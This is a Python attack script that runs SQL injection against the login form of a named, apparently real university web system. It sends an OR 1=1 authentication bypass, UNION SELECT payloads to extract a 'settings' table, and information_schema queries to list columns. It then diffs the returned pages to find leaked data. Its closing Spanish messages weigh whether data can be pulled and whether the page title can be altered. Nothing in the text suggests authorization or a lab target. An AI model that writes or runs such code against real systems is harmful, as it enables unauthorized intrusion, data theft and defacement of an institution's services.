#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# First, find the baseline
r_base = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                       data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)
r_base_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# Now try to extract settings data
# The settings table has columns nombre, valor
# Try to get the data

payloads = [
    ("' UNION SELECT nombre, valor FROM settings --", "nombre, valor"),
    ("' UNION SELECT 1, nombre, valor FROM settings --", "1, nombre, valor"),
    ("' UNION SELECT 1, 2, nombre, valor FROM settings --", "1, 2, nombre, valor"),
]

for payload, desc in payloads:
    r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    
    tc = re.sub(r'<[^>]+>', ' ', r_mod.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    # Check if the page has different content
    tc_base = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
    tc_base = re.sub(r'\s+', ' ', tc_base).strip()
    
    if tc != tc_base:
        print(f"[DIFFERENT] {desc}")
        # Find what's different
        # Look for unique words
        words = set(tc.split())
        base_words = set(tc_base.split())
        unique = words - base_words
        if unique:
            print(f"  Unique words: {list(unique)[:20]}")
        # Look for any text that looks like settings data
        # Search for patterns like key-value pairs
        for pattern in [r'SIIGAA[^<]*', r'control[^<]*', r'title[^<]*', r'nombre[^<]*', r'valor[^<]*']:
            matches = re.findall(pattern, tc, re.IGNORECASE)
            for m in matches[:5]:
                print(f"  Match: {m[:100]}")
    else:
        print(f"Same content: {desc}")

# Try to directly extract settings data by looking at the HTML source
print("\n=== EXTRACCIÓN DIRECTA ===\n")

# Get the full HTML source of modulos.xhtml after SQL injection with settings
r_full = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                       data={'j_username': "' UNION SELECT nombre, valor FROM settings --", 'j_password': 'x'}, timeout=5)
r_full_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# Look for any text that might be settings data
# The settings table might have data that appears in the HTML
# Search for any non-standard text
full_text = r_full_mod.text
# Look for any text between HTML tags that might be settings data
# The data might appear in the DataGrid or in hidden elements

# Check for any data in the page
# The DataGrid might have data rows
# Look for any <td> elements with data
td_data = re.findall(r'<td[^>]*>([^<]+)</td>', full_text)
print(f"TD data: {td_data}")

# Look for any data in the DataGrid widget
# The DataGrid might render data from the database
# Check for any unique content in the page
# The page has "No records found" — if settings had data, it would show

# Try to extract column names from information_schema
print("\n=== COLUMNAS DE settings ===\n")
col_payloads = [
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='settings' --",
    "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='settings' --",
    "' UNION SELECT column_name, ordinal_position FROM information_schema.columns WHERE table_name='settings' --",
]

for cp in col_payloads:
    r_c = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': cp, 'j_password': 'x'}, timeout=5)
    r_mod_c = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_c = re.sub(r'<[^>]+>', ' ', r_mod_c.text)
    tc_c = re.sub(r'\s+', ' ', tc_c).strip()
    
    if 'column_name' in tc_c.lower():
        print(f"[!] Column names found: {cp[:60]}")
        # Extract column names
        cols = re.findall(r'column_name[^<]*', tc_c)
        print(f"  {cols[:10]}")
    elif tc_c != re.sub(r'<[^>]+>', ' ', r_base_mod.text):
        print(f"[DIFFERENT] {cp[:60]}")
        # Find unique text
        tc_base = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        unique = set(tc_c.split()) - set(tc_base.split())
        print(f"  Unique: {list(unique)[:15]}")

# Try to get settings data using information_schema
print("\n=== DATOS settings ===\n")
# Try to SELECT data from settings using information_schema
# The settings table has columns: nombre, valor
# Let's try to extract the actual data

data_payloads = [
    "' UNION SELECT nombre, valor FROM settings --",
    "' UNION SELECT 1, nombre FROM settings --",
    "' UNION SELECT nombre, 2 FROM settings --",
]

for dp in data_payloads:
    r_d = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': dp, 'j_password': 'x'}, timeout=5)
    r_mod_d = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_d = re.sub(r'<[^>]+>', ' ', r_mod_d.text)
    tc_d = re.sub(r'\s+', ' ', tc_d).strip()
    
    # Check if the data appears
    # Look for any text that might be settings data
    # The data might be rendered in the DataGrid
    td_data_d = re.findall(r'<td[^>]*>([^<]+)</td>', tc_d)
    print(f"  {dp[:50]}")
    print(f"  TD data: {td_data_d}")
    if td_data_d:
        print(f"  [!] Data visible in page!")
    else:
        # Check for any unique text
        tc_base_d = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
        tc_base_d = re.sub(r'\s+', ' ', tc_base_d).strip()
        unique_d = set(tc_d.split()) - set(tc_base_d.split())
        if unique_d:
            print(f"  Unique: {list(unique_d)[:10]}")

print("\n=== CONCLUSION ===")
print("Si settings tiene datos, se pueden extraer")
print("Si settings esta vacia, no hay datos para modificar")
print("El titulo 'CONTROL DE ACCESO' esta en HTML estatico")
print("No puede modificarse via SQL Injection")
